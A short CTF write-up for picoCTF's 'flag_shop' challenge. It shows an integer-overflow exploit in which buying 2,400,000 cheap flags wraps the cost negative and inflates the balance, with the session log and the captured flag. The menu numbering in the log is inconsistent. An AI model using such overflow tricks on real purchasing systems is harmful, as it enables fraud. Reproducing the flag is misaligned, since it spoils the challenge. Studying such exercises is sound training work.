## flag_shop

#### Description

There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c). Connect with `nc jupiter.challenges.picoctf.org 4906`.



#### Hints:
1. Two's compliment can do some weird things when numbers get really big!



## Solución:

```
1. Conectarnos usando wenshell a: nc jupiter.challenges.picoctf.org 4906
-Ingresamos las opciones que estan ahi y ingresamos esto: (2,1,2400000,2,2,1)

grbau21-picoctf@webshell:~$ nc jupiter.challenges.picoctf.org 4906
Welcome to the flag exchange
We sell flags

2. Check Account Balance

3. Buy Flags

4. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2400000

The final cost is: -2134967296

Your current balance after transaction: 2134968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection
^C
grbau21-picoctf@webshell:~$ 



Flag: picoCTF{m0n3y_bag5_9c5fac9b}


```

